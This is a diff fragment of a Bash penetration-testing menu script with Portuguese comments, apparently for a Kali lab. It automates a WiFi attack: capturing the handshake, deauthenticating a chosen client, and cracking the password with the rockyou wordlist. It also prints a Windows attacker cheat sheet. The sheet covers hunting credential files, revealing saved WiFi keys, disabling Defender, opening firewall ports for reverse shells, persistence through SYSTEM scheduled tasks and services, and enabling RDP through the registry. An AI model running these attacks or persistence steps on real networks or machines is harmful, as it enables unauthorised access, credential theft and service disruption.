+            airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_alvo_log
+        }
+
+        # Função para capturar o handshake de autenticação entre o cliente e o AP alvo
+        function captura_4whsk(){
+            # Abre uma nova sessão do Tilix e executa o comando airodump-ng para capturar o handshake de autenticação entre o cliente e o AP alvo.
+            # Os resultados são escritos em um arquivo de log chamado captura_4whsk_log.
+            # O redirecionamento "> /dev/null 2>&1" é utilizado para suprimir a saída padrão e de erro do comando, e o processo é executado em segundo plano "&".
+            tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write captura_4whsk_log > /dev/null 2>&1 &
+        }
+
+        # Função para realizar um ataque de desautenticação (deauth) no cliente especificado
+        function ataque_deauth(){  
+            echo ""
+            echo "============================================"
+            read -r -p "MAC do cliente para ser desconectado: " CLNTMAC
+            echo "============================================"
+            echo ""
+            # Deauth no cliente
+            for ((i=1;i<=3;i++)); do
+                # Executa o comando aireplay-ng para realizar o ataque de desautenticação.
+                # A opção "--deauth=5" indica o número de pacotes de desautenticação a serem enviados.
+                # Os parâmetros "-a" e "-c" especificam o endereço MAC do AP alvo e do cliente, respectivamente.
+                # A saída do comando é salva em um arquivo de log chamado ataque_deauth.log, utilizando o comando "tee -a".
+                aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLNTMAC" mon0 | tee -a ataque_deauth.log
+                # Mensagem para informar o intervalo entre os ataques de desautenticação
+                echo "Intervalo de 5s entre um ataque e outro de Deauth. Aperte Ctrl+C para cancelar após a captura do 4-way-handshake"
+                if [ $i -lt 3 ]; then #TODO:VERIFICAR NECESSIDADE DESSE IF
+                    sleep 5
+                fi
+            done
+        }
+
+        # Função para quebrar a senha usando um dicionário de palavras
+        function quebra_senha_dicionario(){
+            aircrack-ng captura_4whsk_log*.cap -w /usr/share/wordlists/rockyou.txt
+        }
+
+        # Função principal para executar todas as etapas do ataque
+        function main_wifi_atk(){
+            # Executa as configurações pré-ataque
+            pre_configuracoes;
+            # Verifica as interfaces disponíveis
+            interfaces_disponiveis;
+            # Realiza as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
+            configuracoes_iniciais;
+            # Inicia o monitoramento em modo promíscuo
+            monitoramento_promiscuo;
+            # Escaneia o AP alvo e grava os resultados em um arquivo de log
+            scan_ap_alvo;
+            # Captura o handshake de autenticação entre o cliente e o AP alvo
+            captura_4whsk;
+            # Realiza um ataque de desautenticação no cliente especificado
+            ataque_deauth;
+            # Tenta quebrar a senha utilizando um dicionário
+            quebra_senha_dicionario;
+            # Mensagem para pressionar ENTER para continuar
+            echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+            read -r 2> /dev/null
+            # Chamada da função principal do menu principal após pressionar ENTER
+            main_menu;  
+        }
+
+        # Chama a função principal
+        main_wifi_atk;
+
+    }
+    #
+    function xix_cmd_basicos_windows(){
+        clear
+        echo -e ""
+        function comandos_basicos() {
+            echo -e "${WHITE}############################## COMANDOS BÁSICOS ##############################${RESET}"
+            echo -e "${RED}help ${GRAY}# Mostra os comandos disponíveis.${RESET}"
+            echo -e "${RED}help <comando> OR <comando> /? ${GRAY}# Mostra a ajuda para utilizar determinado comando.${RESET}"
+            echo -e ""
+            echo -e "${RED}cls ${GRAY}# Serve para limpar a tela do terminal em uso${RESET}"
+        }
+        function dir_cmd(){
+            echo -e "${WHITE}################### DIR #######################${RESET}"
+            echo -e "${RED}dir ${GRAY}# Serve para listar os arquivos presentes no diretório atual.${RESET}"
+            echo -e "${RED}dir /a ${GRAY}# Lista inclusive arquivos ocultos${RESET}"
+            echo -e ""
+        }
+        function gamb_dir2find(){
+            echo -e "${WHITE}############### GAMBIARRA SEMELHANTE AO FIND #################${RESET}"
+            echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config* ${GRAY}# Busca por arquivos que contenham o nome especificado, a partir do diretório atual. (observação: '==' é equivalente a 'or')${RESET}"
+            echo -e ""
+        }
+        function cd_cmd(){
+            echo -e "${WHITE}################### CD #######################${RESET}"
+            echo -e "${RED}cd <diretorio> ${GRAY}# Serve para navegar entre os diretórios do Windows.${RESET}"
+            echo -e "${RED}cd .. ${GRAY}# Navegar para um diretório acima do diretório atual${RESET}"
+            echo -e "${RED}cd ${GRAY}# Mostra qual o diretório atual (semelhante ao \"pwd\" do linux)${RESET}"
+            echo -e ""
+            echo -e "${RED}md ${GRAY}# Serve para criar um novo diretório.${RESET}"
+            echo -e ""
+        }
+        function rd_cmd(){
+            echo -e "${WHITE}################### RD #######################${RESET}"
+            echo -e "${RED}rd ${GRAY}# Serve para deletar um diretório.${RESET}"
+            echo -e "${RED}rd /s ${GRAY}# modo recursivo${RESET}"
+            echo -e "${RED}rd /q ${GRAY}# (quiet, sem pedir confirmação)${RESET}"
+            echo -e ""
+            echo -e "${RED}type ${GRAY}# Exibe o conteúdo, em formato de texto, de um arquivo.${RESET}"
+            echo -e ""
+            echo -e "${RED}ren <nome_antigo> <nome_novo> ${GRAY}# Renomear determinado arquivo ou diretório.${RESET}"
+            echo -e ""
+        }
+        function xcopy_cmd(){
+            echo -e "${WHITE}################### XCOPY #######################${RESET}"
+            echo -e "${RED}xcopy <arquivo_original> <nome_da_copia> ${GRAY}# Faz a cópia de arquivos/diretórios. Porém não copia os subdiretórios.${RESET}"
+            echo -e ""
+            echo -e "${RED}xcopy /e <original> <copia> ${GRAY}# Copia inclusive subdiretórios.${RESET}"
+            echo -e "${RED}xcopy /s <original> <copia> ${GRAY}# Copia inclusive subdiretórios, exceto os subdiretórios vazios.${RESET}"
+            echo -e ""
+            echo -e ""
+            echo -e "${RED}del ${GRAY}# Deleta um arquivo e/ou diretório${RESET}"
+            echo -e ""
+            echo -e ""
+            echo -e "${RED}move <origem> <destino> ${GRAY}# Move um arquivo/diretório de um local para outro.${RESET}"
+            echo -e ""
+        }
+        function whoami_cmd(){
+            echo -e "${WHITE}################### WHOAMI #######################${RESET}"
+            echo -e "${RED}whoami ${GRAY}# Mostra o nome de usuário e domínio atual.${RESET}"
+            echo -e "${RED}whoami /priv ${GRAY}# Mostra os privilégio do usuário.${RESET}"
+            echo -e ""
+        }
+        function tree_cmd(){
+            echo -e "${WHITE}################### TREE #######################${RESET}"
+            echo -e "${RED}tree ${GRAY}# Lista o diretório atual e todos os seus subdiretórios.${RESET}"
+            echo -e "${RED}tree <diretorio> ${GRAY}# Lista o diretório informado e todos os seus subdiretórios${RESET}"
+            echo -e "${RED}tree /f ${GRAY}# Lista o diretório atual, assim como todos os seus subdiretórios e arquivos.${RESET}"
+            echo -e ""
+        }
+        function shutdown_cmd(){
+            echo -e "${WHITE}################### SHUTDOWN #######################${RESET}"
+            echo -e "${RED}shutdown ${GRAY}# Desligar/ reiniciar o sistema.${RESET}"
+            echo -e "${RED}shutdown /s ${GRAY}# Desligar${RESET}"
+            echo -e "${RED}shutdown /l ${GRAY}# fazer logoff${RESET}"
+            echo -e "${RED}shutdown /r ${GRAY}# reiniciar${RESET}"
+            echo -e "${RED}shutdown /f ${GRAY}# executar shutdown sem avisar o usuário (Força fechamento dos programas em execução)${RESET}"
+            echo -e "${RED}shutdown /c \"comentario\" ${GRAY}# aparece um aviso para o usuário antes de fazer o desligamento.${RESET}"
+            echo -e ""
+        }
+        function outros(){
+            echo -e "${WHITE}################### OUTROS #######################${RESET}"
+            echo -e "${RED}> ${GRAY}# Direciona a saída de um comando para um arquivo (substituindo o conteúdo do arquivo).${RESET}"
+            echo -e "${RED}>> ${GRAY}# Direciona a saída de um comando para o conteúdo de um arquivo (Adiciona o conteúdo do arquivo).${RESET}"
+            echo -e ""
+            echo -e "${RED}sort arquivo.txt ${GRAY}# Exibe o conteúdo do arquivo especificado, na ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
+            echo -e "${RED}sort /r arquivo.tx ${GRAY}# Exibe o conteúdo do arquivo especificado, de maneira inversa à ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
+            echo -e ""
+            echo -e "${RED}type arquivo.txt | sort ${GRAY}# O comando sort é executado em cima do resultado do comando type.${RESET}"
+            echo -e ""
+            echo -e "${RED}2>nul ${GRAY}# Omite a saída de erros de um comando.${RESET}"
+            echo -e ""
+        }
+        function findstr_cmd(){
+            echo -e "${WHITE}################### FINDSTR #######################${RESET}"
+            echo -e "${RED}findstr \"string\" <arquivo.txt> ${GRAY}# Exibe apenas as linhas do arquivo.txt que possuam a string especificada.${RESET}"
+            echo -e "${RED}findstr /spin /c:\"password\" *.* 2>nul ${GRAY}# Procura, em todos os arquivos a partir do diretório atual, por arquivos que contenham a string especificada.${RESET}"
+            echo -e ""
+        }
+        function attrib_cmd(){
+            echo -e "${WHITE}################### ATTRIB #######################${RESET}"
+            echo -e "${RED}attrib ${GRAY}# Exibe os atributos dos arquivos do diretório atual.${RESET}"
+            echo -e "${RED}attrib /d ${GRAY}# Exibe os atributos dos arquivos e diretórios do diretório atual. ${RESET}"
+            echo -e "${RED}attrib /s ${GRAY}# Exibe os atributos dos arquivos do diretório atual e dos arquivos nos subdiretórios.${RESET}"
+            echo -e ""
+            echo -e "${RED}attrib +S +H <arquivo> ${GRAY}# Deixa um arquivo oculto e não mostra esse arquivo, quando aberto pela interface gráfica, mesmo com a opção de "mostrar arquivos ocultos" estando ativa.${RESET}"
+            echo -e ""
+        }
+        function cmd4enum_cmd(){
+            echo -e "${WHITE}################### CMD 4 ENUM #######################${RESET}"
+            echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config*${RESET}"
+            echo -e "${RED}tree /f${RESET}"
+            echo -e "${RED}findstr /spin /c:\"password\" *.* 2>null${RESET}"
+            echo -e ""
+        }
+        function icalcs(){
+            echo -e "${WHITE}################### ICALCS #######################${RESET}"
+            echo -e "${RED}ICACLS: —> Lista e gerencia as DACL (informações de permissão) das pastas/arquivos.${RESET}"
+            echo -e ""
+            echo -e "${GRAY}Exemplo:${RESET}"
+            echo -e "${BLUE}> icacls \"arquivo 2.txt\"${RESET}"
+            echo -e "${GRAY}#arquivo 2.txt AUTORIDADE NT\SISTEMA:(I)(F) -- SYSTEM${RESET}"
+            echo -e "${GRAY}#              BUILTIN\Administradores:(I)(F) -- USUARIOS ADMIN${RESET}"
+            echo -e "${GRAY}#              DESKTOP-JPMQF3L\aluno:(I)(F) -- USUARIO aluno MAQUINA JPMQF3L${RESET}"
+            echo -e ""
+            echo -e "${RED}icacls arquivo /grant aluno:F ${GRAY}# Adicionar permissões${RESET}"
+            echo -e ""
+            echo -e "${RED}icacls arquivo /deny aluno:F ${GRAY}# Negar permissões${RESET}"
+            echo -e ""
+            echo -e "${RED}whoami /groups ${GRAY}# Verificar o nível de integridade${RESET}"
+        }
+        function system_info(){
+            echo -e ""
+            echo -e "${WHITE}################### INFORMAÇOES DO SISTEMA #######################${RESET}"
+            echo -e "${RED}hostname ${GRAY}# Exibe o nome do host${RESET}"
+            echo -e ""
+            echo -e "${RED}netstat -ano ${GRAY}# Mostra serviços com portas e conexões ativas.${RESET}"
+            echo -e ""
+            echo -e "${RED}ver ${GRAY}# Exibe a build do sistema${RESET}"
+            echo -e ""
+            echo -e "${RED}systeminfo ${GRAY}# Exibe informações do sistema${RESET}"
+            echo -e ""
+            echo -e "${RED}winver ${GRAY}# Exibe a versão, build e SO.${RESET}"
+            echo -e ""
+        }
+        function processos_gerenciamento(){
+            echo -e "${WHITE}################### GERENCIAMENTO DE PROCESSOS #######################${RESET}"
+            echo -e "${GRAY}Processo corresponde a uma instância de um programa, ou seja, um programa que está sendo executado no sistema operacional, consumindo recursos.${RESET}"
+            echo -e ""
+            echo -e "${RED}wmic product get name,version,installlocation ${GRAY}# Lista os programas instalados no sistema, assim como suas versões e locais onde estão instalado.${RESET}"
+            echo -e ""
+            echo -e "${RED}tasklist ${GRAY}# Lista os processos ativos, nomes, PID, etc...${RESET}"
+            echo -e "${RED}tasklist /M ${GRAY}# lista as DLL que cada processo usa${RESET}"
+            echo -e "${RED}tasklist /SVC ${GRAY}# lista os serviços relacionados com esse processo${RESET}"
+            echo -e "${RED}tasklist /V ${GRAY}# Mostra qual usuário está utilizando determinado processo${RESET}"
+            echo -e ""
+            echo -e "${RED}taskkill /pid xxxx /f ${GRAY}# Mata determinado processo ativo (Ex: taskkill /pid 3395).${RESET}"
+            echo -e ""
+        }
+        function usuarios_gerenciamento(){
+            echo -e "${WHITE}################### GERENCIAMENTO DE USUARIOS #######################${RESET}"
+            echo -e "${RED}net user ${GRAY}# Listar usuários da maquina${RESET}"
+            echo -e "${RED}net user <usuario> ${GRAY}# Ver detalhes do usuário (grupos, etc)${RESET}"
+            echo -e "${RED}net localgroup ${GRAY}# Lista grupos existentes na máquina${RESET}"
+            echo -e "${RED}net localgroup <nome_do_grupo> ${GRAY}# Ver quais usuários estão em determinado grupo${RESET}"
+            echo -e "${RED}net user <novo_usuario> <nova_senha> /add ${GRAY}# Criar novo usuário${RESET}"
+            echo -e "${RED}net user <usuario> /del ${GRAY}# Remover o usuário especificado ${RESET}"
+            echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /add ${GRAY}# Adicionar o usuário especificado no grupo especificado${RESET}"
+            echo -e "${RED}net localgroup <nome_do_grupo> <nome_do_usuario> /del ${GRAY}# Remover o usuário especificado no grupo especificado ${RESET}"
+            echo -e "${RED}net user <usuario> <nova_senha> ${GRAY}# Alterar senha de um usuário${RESET}"
+            echo -e "${RED}net user <usuario> /active:yes ${GRAY}# Habilitar ou desabilitar usuário (yes ou no)${RESET}"
+            echo -e ""
+        }
+        function firewall_gerenciamento(){
+            echo -e "${WHITE}################### GERENCIAMENTO DE FIREWALL #######################${RESET}"
+            echo -e "${RED}netsh advfirewall show currentprofile ${GRAY}# Mostra o status do firewall (apenas o perfil ativo)"
+            echo -e "${RED}netsh advfirewall set allprofiles state off ${GRAY}# Desabilita o firewall do Windows."
+            echo -e "${RED}netsh advfirewall set allprofiles state on ${GRAY}# Habilita o firewall do Windows."
+            echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp program=\"C:\caminho\programa.exe\" enable=yes ${GRAY}# Permitir que um programa especifico no echo -e firewall."
+            echo -e "${RED}netsh advfirewall firewall add rule name=\"nome_da_regra\" dir=in action=allow protocol=tcp localport=4444 enable=yes ${GRAY}# Abrir a porta especificada no firewallecho -e "
+            echo -e ""
+            echo -e "${GRAY}# dir = in | out"
+            echo -e "${GRAY}# action = allow|block"
+            echo -e "${GRAY}# protocol = TCP | UDP |any"
+            echo -e "${GRAY}# Obs: As portas 80 e 443 costumam estar abertas para conexões de saída. Interessante tentar utilizar essas portas para obter um shell reverso."
+            echo -e ""
+        }
+        function antivirus_gerenciamento(){
+            echo -e "${WHITE}################### GERENCIAMENTO DE ANTIVIRUS #######################${RESET}"
+            echo -e "${GRAY}Sequencia de comandos para tentar desabilitar o Windows defender, utilizando o powershell. Não é necessário reiniciar a máquina. Mudar para ${GREEN} \$false ${RESET}${GRAY} caso queira reativar:${RESET}"
+            echo -e ""
+            echo -e "${RED}powershell.exe Set-MpPreference -DisableRealTimeMonitoring \$true ${GRAY}# Desabilita o scan em tempo real${RESET}"
+            echo -e ""
+            echo -e "${GRAY}No Windows a partir da ${GREEN}build 18305, a proteção contra violações do Windows defender deve estar desativada.${RESET}${GRAY} Para verificar se a proteção contra violações está ativa, use o comando:"
+            echo -e ""
+            echo -e "${RED}powershell.exe Get-MpComputerStatus${RESET}"
+            echo -e ""
+            echo -e "${GRAY}Na saída do comando acima, ${RED}procurar por \"IsTamperProtected\". Caso esteja como true, não será possível desabilitar o Windows defender via terminal.${RESET}"
+            echo -e ""
+        }
+        function tarefas_agendadas_gerenciamento(){
+            echo -e "${WHITE}################### GERENCIAMENTO DE TAREFAS AGENDADAS #######################${RESET}"
+            echo -e ""
+            echo -e "${RED}schtasks /query /v /fo list ${GRAY}# Lista as tarefas agendadas disponíveis no sistema. Filtrar saída com findstr para buscar algo especifico.${RESET}"
+            echo -e "${RED}schtasks /query /v /fo list | findstr /L \".exe\" ${GRAY}# Exemplo${RESET}"
+            echo -e "${RED}schtasks /query /v /fo list | findstr /L \".bat\" ${GRAY}# Exemplo${RESET}"
+            echo -e ""
+            echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"dominio\usuário\" /RP \"senha_do_usuário\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário especificado, a cada minuto.${RESET}"
+            echo -e ""
+            echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"system\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário system, a cada minuto (Precisa ser executado por um terminal com privilégio [obter persistência após explorar um alvo]).${RESET}"
+            echo -e ""
+            echo -e "${RED}schtasks /run /I /TN \"nome_da_tarefa_agendada\" ${GRAY}# Executar imediatamente determinada tarefa agendada. ${RESET}"
+            echo -e "${RED}schtasks /delete /tn \"nome_da_tarefa\" ${GRAY}# Deletar uma tarefa agendada.${RESET}"
+            echo -e "${RED}schtasks /delete /tn \"windowsupdate\"${RESET}"
+            echo -e ""
+        }
+        function servicos_gerenciamento(){
+            echo -e "${WHITE}################### GERENCIAMENTO DE SERVIÇOS #######################${RESET}"
+            echo -e ""
+            echo -e "${RED}sc query ${GRAY}# lista os serviços ativos.${RESET}"
+            echo -e "${RED}sc query state= all ${GRAY}# Lista todos os serviços${RESET}"
+            echo -e ""
+            echo -e "${RED}wmic service get name,pathname,startmode,startname ${GRAY}# Mostra os serviços, com alguns filtros${RESET} "
+            echo -e ""
+            echo -e "${RED}sc query state= all | findstr \"NOME_DO_SERVIÇO\" ${GRAY}# Lista apenas os nomes dos serviços (Para Windows em português)${RESET}"
+            echo -e ""
+            echo -e "${RED}sc create \"nome_do_serviço\" binPath= \"caminho_do_executável\" DisplayName= \"descrição_do_serviço\" start= \"auto\" obj= \".\ LocalSystem\" ${GRAY}# Criar um novo serviço, que será executado pelo usuário system.${RESET}"
+            echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
+            echo -e "${YELLOW}${BG_BLACK}##### - Atenção para o espaço após os sinais de " = " !!! ######${RESET}"
+            echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
+            echo -e ""
+            echo -e "${RED}sc qc <nome_do_servico> ${GRAY}# Mostra configurações e informações de um serviço.${RESET}"
+            echo -e "${RED}sc start <nome_do_servico> ${GRAY}# Inicia um serviço${RESET}"
+            echo -e "${RED}sc stop <nome_do_servico> ${GRAY}# Para um serviço${RESET}"
+            echo -e "${RED}sc delete \"nome_do_serviço\" ${GRAY}# Exclui um serviço${RESET}"
+            echo -e "${RED}sc config <nome_do_servico> binPath= <novo_caminho_do_executavel> ${GRAY}# Exemplo de comando para mudar o caminho do executável que o serviço executa.${RESET}"
+            echo -e ""
+        }
+        function extracao_senhas(){
+            echo -e "${WHITE}################### EXTRAÇÃO DE SENHAS #######################${RESET}"
+            echo -e ""
+            echo -e "${RED}netsh wlan show profiles ${GRAY}# Mostra as redes wi-fi que estão salvas na maquina.${RESET}"
+            echo -e "${RED}netsh wlan show profiles name=\"nome_da_rede\" key=clear ${GRAY}# Exibe algumas informações da rede wi-fi salva, inclusive a senha em claro.${RESET}"
+            echo -e ""
+
+        }
+        function registros_windows(){
+            echo -e "${WHITE}################### REGISTRO DO WINDOWS #######################${RESET}"
+            echo -e "${RED}HKEY_CLASSES_ROOT (HKCR)${GRAY}: Presente nas versões atuais do Windows apenas para manter a compatibilidade com programas mais antigos.${RESET}"
+            echo -e "${RED}HKEY_CURRENT_USER (HKCU)${GRAY}: Contém todas as configurações do usuário logado no sistema.${RESET}"
+            echo -e "${RED}HKEY_LOCAL_MACHINE (HKLM)${GRAY}: Chave mais importante do registro, guarda todas as informações que o sistema operacional precisa para funcionar e de sua interface gráfica. Utiliza o arquivo SYSTEM para armazenar essas configurações.${RESET}"
+            echo -e "${RED}HKEY_USERS (HKU)${GRAY}: Guarda as configurações de aparência do Windows e as configurações efetuadas pelos usuários, como papel de parede, protetor de tela, temas e outros.${RESET}"
+            echo -e "${RED}HKEY_CURRENT_CONFIG (HKCC)${GRAY}: Salva os perfis de hardware utilizados pelo usuário.${RESET}"
+            echo -e "${RED}HKEY_LOCAL_MACHINE\Software\RegisteredApplications${GRAY} = subchave \"RegisteredApplications\" da subchave \"Software\" da chave HKEY_LOCAL_MACHINE.${RESET}"
+            echo -e ""
+            echo -e "${YELLOW}Através do registro do Windows, é possível mudar o comportamento padrão de alguns programas do Sistema Operacional, assim como é possível conseguir algumas informações importantes, como versão de programas, senhas, etc${RESET}"
+            echo -e "${GRAY}Exemplos:"
+            echo -e "   ${RED}\"HKLM\SOFTWARE\RealVNC\WinVNC4\" /v password ${GRAY}# O programa RealVNC salva a senha criptografada no seguinte valor do registro${RESET}"
+            echo -e "   ${RED}\"HKCU\Software\SimonTatham\PuTTY\" ${GRAY}# O programa PuTTY salva detalhes sobre conexões realizadas utilizando o programa, na seguinte subchave${RESET}"
+            echo -e "   ${RED}\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections ${GRAY}# O windows utiliza o seguinte valor para habilitar/desabilitar o acesso remoto ao sistema${RESET}"
+            echo -e ""
+            echo -e "${YELLOW}REGISTRO DO WINDOWS - Interagindo via terminal${RESET}"
+            echo -e "   ${RED}reg query chave\subchave\subchave\subchave ${GRAY}# Comando para ver os valores e subchaves contido no caminho especificado.${RESET} "
+            echo -e "   ${RED}reg query \"HKLM\SOFTWARE\WinRAR\Capabilities\FileAssociations\" ${GRAY}# Exemplo${RESET}"
+            echo -e "   ${RED}reg add <chave\subchave\subchave> ${GRAY}# Adicionar uma subchave no no registro"
+            echo -e "   ${RED}reg add <chave\subchave\subchave> /v <nome_do_valor> /t <tipo> /d <dado> ${GRAY}# Adicionar um valor no registro.${RESET}"
+            echo -e "   ${RED}reg delete <chave\subchave\subchave> ${GRAY}# Remover uma chave do registro${RESET}"
+            echo -e "   ${RED}reg save <chave\subchave\subchave arquivo_de_saida> ${GRAY}# Copiar chaves/subchaves para um arquivo.${RESET}"
+            echo -e ""
+            echo -e ">>> !!! IMPORTANTE !!! <<<   ${RED}reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f ${GRAY}# Ao editar essa chave, o protocolo RDP fica ativado na maquina${RESET}"
+        } 
+        function main_cmd_basicos_windows(){
+            comandos_basicos;
+            dir_cmd;
+            cd_cmd;
+            rd_cmd;
+            xcopy_cmd;
+            whoami_cmd;
+            tree_cmd;
+            shutdown_cmd;
+            findstr_cmd;
+            gamb_dir2find;
+            attrib_cmd;
+            cmd4enum_cmd;
+            icalcs;
+            system_info;
+            processos_gerenciamento;
+            usuarios_gerenciamento;
+            firewall_gerenciamento;
+            antivirus_gerenciamento;
+            tarefas_agendadas_gerenciamento
+            servicos_gerenciamento;
+            registros_windows;
+            outros;
+        }
+        main_cmd_basicos_windows | tee comandos_windows.txt;
+        echo "Arquivo comandos_windows.txt gerado para consultas"
+        pausa_script;
+
+        # Chamada da função principal do menu principal após pressionar ENTER
+        main_menu;
 
 
-}
-#
-function xxii_nmap_descoberta_de_rede(){
-    local rede
-    rede="$(ipcalc -n -b -n -b "$(ip -br a | grep tap | head -n 1 | awk '{print $3}')" | awk '/Network/ {print $2}')"
-    cd /usr/share/nmap/scripts && nmap -sC -sV -vv -O $rede | tee /home/kali/nmap.txt
-    echo ""
-    pausa_script;
-}
-#
-function xxiii_nmap(){
-    echo "nmap"
-}
-#
-function xxiv_revshell_windows(){
-    echo "revshell_windows"
-}
-#
-function xxv_rdp_windows(){
-    echo -n "Insira o IP do host windows: "
-    read -r  IP_HOST
-    echo -n "Insira o usuario: "
-    read -r USER
-    echo -n "Insira o password: "
-    read -r PASSWD
-    tilix --action=app-new-session --command="$(xfreerdp /u:"$USER" /p:"$PASSWD" /w:1366 /h:768 /v:"$IP_HOST" /smart-sizing +auto-reconnect)"
-}
-#
+    }
+    #
+    function xxii_nmap_descoberta_de_rede(){
+        local rede
+        rede="$(ipcalc -n -b -n -b "$(ip -br a | grep tap | head -n 1 | awk '{print $3}')" | awk '/Network/ {print $2}')"
+        cd /usr/share/nmap/scripts && nmap -sC -sV -vv -O $rede | tee /home/kali/nmap.txt
+        echo ""
+        pausa_script;
+    }
+    #
+    function xxiii_nmap(){
+        echo "nmap"
+    }
+    #
+    function xxiv_revshell_windows(){
+        echo "revshell_windows"
+    }
+    #
+    function xxv_rdp_windows(){
+        echo -n "Insira o IP do host windows: "
+        read -r  IP_HOST
+        echo -n "Insira o usuario: "
+        read -r USER
+        echo -n "Insira o password: "
+        read -r PASSWD
+        tilix --action=app-new-session --command="$(xfreerdp /u:"$USER" /p:"$PASSWD" /w:1366 /h:768 /v:"$IP_HOST" /smart-sizing +auto-reconnect)"
+    }
+    #
 #============================================================
 
 ######## CHEGAGEM DE PARAMETROS & EXECUÇÃO DO MAIN_MENU ########
